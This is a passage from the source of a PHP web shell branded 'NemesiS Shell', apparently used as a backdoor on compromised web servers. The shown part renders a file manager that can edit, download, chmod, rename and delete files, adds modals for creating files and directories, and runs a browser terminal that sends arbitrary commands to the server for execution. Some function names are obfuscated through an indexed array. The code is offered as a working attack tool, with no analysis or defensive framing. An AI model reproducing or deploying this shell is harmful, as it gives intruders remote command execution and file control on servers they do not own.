                        <a class="ajx" href="?d='.hex($e).'&p='.hex($c).'">CHMOD</a>
                        <a href="?d='.hex($e).'&x='.hex($c).'">D</a>
                    </td>
                </tr>
                '
                        :
                        $j .= '<tr class="r">
                    <td>
                        <i class="far fa-file m"></i>&thinsp;
                        <a class="ajx" href="?d='.hex($e).'&s='.hex($c).'">'.$c.'</a>
                    </td>
                    <td class="x">
                        '.$s.'
                    </td>
                    <td class="x">
                        <a class="ajx'.$o.'" href="?d='.hex($e).'&k='.hex($c).'">'.x("$d/$c").'</a>
                    </td>
                    <td class="x">
                        <a class="ajx" href="?d='.hex($e).'&t='.hex($c).'">'.$GNJ[20]("Y-m-d H:i", $GNJ[21]("$d/$c")).'</a>
                    </td>
                    <td class="x">
                        <a class="ajx" href="?d='.hex($e).'&r='.hex($c).'">RENAME</a>
                        <a class="ajx" href="?d='.hex($e).'&e='.hex($c).'">EDIT</a>
                        <a href="?d='.hex($e).'&g='.hex($c).'">GET</a>
                        '.$zi.'
                        <a class="ajx" href="?d='.hex($e).'&p='.hex($c).'">CHMOD</a>
                        <a href="?d='.hex($e).'&x='.hex($c).'">DEL</a>
                    </td>
                </tr>
                ';
                    }
                }
            }

            echo $h;
            echo $j;
            echo '</tbody>
                <tfoot>
                    <tr>
                        <th class="et">
                           
                            <a href="?d='.hex($e).'&q">DELETE THIS SHELL</a>
                        </th>
                        <th class="et" width="11%"></th>
                        <th class="et" width="17%"></th>
                        <th class="et" width="17%"></th>
                        <th class="et" width="11%"></th>
                    </tr>
            </tfoot>
        </table>';
        }
        ?>

    </article>
    
    <footer class="x">
        <div class="author-credit-footer">⚡ NemesiS Shell · crafted by <span>MataKucing</span> ⚡</div>
    </footer>
    
    <?php
    if(isset($_GET["1"])) {
        echo $f;
    }
    elseif(isset($_GET["0"])) {
        echo $g;
    }
    else {
        NULL;
    }
    ?>
    
    <!-- Modal Create File -->
    <div class="modal-overlay" id="modal-create-file">
        <div class="modal">
            <h2>📄 Create File</h2>
            <form method="post" action="<?=basename($_SERVER['PHP_SELF'])?>?d=<?=hex($d)?>">
                <label>Filename</label>
                <input type="text" name="filename" required>
                <label>Content (optional)</label>
                <textarea name="content"></textarea>
                <div class="btn-row">
                    <button type="button" class="cancel" onclick="closeModal('modal-create-file')">Cancel</button>
                    <button type="submit" class="submit" name="create_file" value="1">Create</button>
                </div>
            </form>
        </div>
    </div>
    
    <!-- Modal Create Dir -->
    <div class="modal-overlay" id="modal-create-dir">
        <div class="modal">
            <h2>📁 Create Directory</h2>
            <form method="post" action="<?=basename($_SERVER['PHP_SELF'])?>?d=<?=hex($d)?>">
                <label>Directory Name</label>
                <input type="text" name="dirname" required>
                <div class="btn-row">
                    <button type="button" class="cancel" onclick="closeModal('modal-create-dir')">Cancel</button>
                    <button type="submit" class="submit" name="create_dir" value="1">Create</button>
                </div>
            </form>
        </div>
    </div>

    <script>
    // ============================================================
    // ENHANCED TERMINAL
    // ============================================================
    
    function toggleTerminal() {
        var el = document.getElementById('terminal-section');
        if (el.style.display === 'none' || el.style.display === '') {
            el.style.display = 'block';
            setTimeout(function() {
                document.getElementById('cmd-input').focus();
            }, 50);
        } else {
            el.style.display = 'none';
        }
    }
    
    var cmdHistory = [];
    var cmdIndex = -1;
    
    function runCommand() {
        const input = document.getElementById('cmd-input');
        const cmd = input.value.trim();
        if (!cmd) return;
        
        cmdHistory.push(cmd);
        cmdIndex = cmdHistory.length;
        
        const output = document.getElementById('term-output');
        output.innerHTML += '\n<span style="color:#4ade80">⨠</span> ' + escHtml(cmd) + '\n';
        output.innerHTML += '<span style="color:#333">⏳ executing...</span>\n';
        input.value = '';
        input.disabled = true;
        input.blur();
        
        fetch('', {
            method: 'POST',
            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
            body: 'cmd_action=exec&cmd=' + encodeURIComponent(cmd)
        })
        .then(res => res.text())
        .then(data => {
            output.innerHTML = output.innerHTML.replace('<span style="color:#333">⏳ executing...</span>\n', '');
            
            if (data.trim() === 'CLEAR') {
                output.innerHTML = '<span style="color:#666">NemesiS Terminal v2.0 · Type <span style="color:#4ade80;">help</span> for commands</span>\n<span style="color:#333;">──────────────────────────────────────────</span>\n';
            } else {
                output.innerHTML += data + '\n';
            }
            
            fetch('', {
                method: 'POST',
                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                body: 'cmd_action=exec&cmd=pwd'
            })
            .then(res => res.text())
            .then(cwd => {
                document.getElementById('term-cwd').textContent = cwd.trim();
            });
            
            output.scrollTop = output.scrollHeight;
            input.disabled = false;
            input.focus();
        })
        .catch((err) => {
            output.innerHTML = output.innerHTML.replace('<span style="color:#333">⏳ executing...</span>\n', '');
            output.innerHTML += '<span style="color:#ff5555">✗ Error: ' + escHtml(err.message) + '</span>\n';
            input.disabled = false;
            input.focus();
        });
    }
    
    function escHtml(str) {
        return str.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
    }
    
    function openModal(id) {
        document.getElementById(id).classList.add('on');
    }
    
    function closeModal(id) {
        document.getElementById(id).classList.remove('on');
    }
    
    document.getElementById('cmd-input').addEventListener('keydown', function(e) {
        if (e.key === 'Enter') {
            runCommand();
            return;
        }
        
        if (e.key === 'ArrowUp') {
            e.preventDefault();
            if (cmdHistory.length > 0) {
                cmdIndex = Math.max(0, cmdIndex - 1);
                this.value = cmdHistory[cmdIndex];
            }
        }
        
        if (e.key === 'ArrowDown') {
            e.preventDefault();
            if (cmdHistory.length > 0) {
                cmdIndex = Math.min(cmdHistory.length, cmdIndex + 1);
                this.value = cmdHistory[cmdIndex] || '';
            }
        }
    });
    
    document.addEventListener('keydown', function(e) {
        if (e.key === 'Escape') {
            var term = document.getElementById('terminal-section');
            if (term && term.style.display !== 'none') {
                term.style.display = 'none';
            }
            document.querySelectorAll('.modal-overlay.on').forEach(function(el) {
                el.classList.remove('on');
            });
        }
        
        if (e.ctrlKey && e.shiftKey && (e.key === 't' || e.key === 'T')) {
            e.preventDefault();
            toggleTerminal();
        }
    });
    
    document.getElementById('terminal-section').addEventListener('click', function() {
        document.getElementById('cmd-input').focus();
    });
    
    document.querySelectorAll('.modal-overlay').forEach(function(el) {
        el.addEventListener('click', function(e) {
            if (e.target === this) this.classList.remove('on');
        });
    });
    
    $(".ajx").click(function(t){t.preventDefault();var e=$(this).attr("href");history.pushState("","",e),$.get(e,function(t){$("body").html(t)})});
    
    console.log('NemesiS Shell v2.2 · by MataKucing');
    console.log('🔒 Session: Active');
    console.log('📂 CWD: <?=esc($d)?>');
    console.log('⌨ Ctrl+Shift+T to toggle terminal');
    </script>
</body>
</html>
